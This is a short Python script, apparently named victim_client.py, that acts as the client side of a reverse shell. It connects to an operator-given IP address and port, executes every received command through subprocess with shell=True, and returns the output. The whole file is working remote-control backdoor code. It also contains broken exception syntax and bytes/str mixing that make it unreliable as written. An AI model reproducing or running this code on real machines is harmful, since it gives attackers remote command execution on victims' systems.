import socket
import subprocess
import argparse

def Usage():
    print ("")
    print ("")
    print ('Examples : ')
    print ('victim_client.py -a 192.168.0.33 -p 998')
    exit(0)

def receive_data(client):
    try:
        while True:
            received_cmd = ""
            received_cmd += client.recv(4096)
            if not received_cmd:
                continue
            cmd_results = execute_command(received_cmd)
            client.send(cmd_results)
    except Exception (e):
        print(str(e))
        pass

def execute_command(cmd):
    cmd = cmd.rstrip()
    try:
        result = subprocess.check_output(cmd,stderr=subprocess.STDOUT,shell=True)
    except Exception (e):
        result = "Could not Create Comamnd " + cmd

    return result


def client_connect(host,port):
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        client.connect((host,port))
        print ("Connected with Server " + host + "at port Number " + str(port))
        print (receive_data(client))
    except Exception(e):
        print (str(e))
        client.close()

def main():
    parser = argparse.ArgumentParser(" Victim Client Commander")
    parser.add_argument("-a","--address",type=str,help="Server IP Address")
    parser.add_argument("-p","--port",help="Port Number To Connect with",default=9999)
    args = parser.parse_args()
    if args.address == None:
        Usage()

    target_host = args.address
    port_number = args.port
    client_connect(target_host,port_number)

if __name__ == '__main__':
    main()